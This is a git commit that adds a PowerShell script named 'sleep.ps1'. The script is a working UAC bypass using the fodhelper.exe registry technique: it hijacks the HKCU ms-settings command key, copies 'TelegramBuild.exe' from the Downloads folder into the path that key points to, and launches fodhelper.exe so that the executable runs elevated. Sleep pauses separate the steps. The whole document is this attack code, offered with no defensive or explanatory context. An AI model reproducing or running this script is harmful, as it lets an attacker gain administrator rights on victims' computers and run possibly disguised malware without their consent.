ac6470e9233534ce51647a62f0980a09e6bea759
waed69 <waedpsn2@gmail.com>
2025-04-26 15:57:33 +0200

    Create sleep.ps1

---
+++ sleep.ps1
@@ -0,0 +1,19 @@
+# Create the registry key
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+Start-Sleep -Seconds 3
+
+# Create the 'DelegateExecute' property
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Start-Sleep -Seconds 4
+
+# Set the default command
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
+Start-Sleep -Seconds 3
+
+# Copy the executable
+Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
+Start-Sleep -Seconds 4
+
+# Run fodhelper.exe
+Start-Process "fodhelper.exe"
+Start-Sleep -Seconds 3
